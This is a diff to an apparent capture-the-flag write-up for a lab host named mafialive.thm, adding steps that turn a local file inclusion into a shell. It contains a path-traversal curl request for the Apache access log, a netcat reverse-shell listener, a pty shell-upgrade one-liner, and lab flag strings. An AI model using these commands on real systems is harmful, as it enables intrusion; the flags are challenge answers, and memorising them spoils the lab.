@@ -44,6 +44,12 @@ test.php
 thm{explo1t1ng_lf1}
 ```
 ### Get a shell and find the user flag
+* ```curl -s http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log```
+* ```nc -lvnp 4444```
+* ```python3 -c "import pty;pty.spawn('/bin/bash')"```
+* ```id```
+* ```ls```
+### cat user.txt
 ```
 thm{lf1_t0_rc3_1s_tr1cky}
 ```
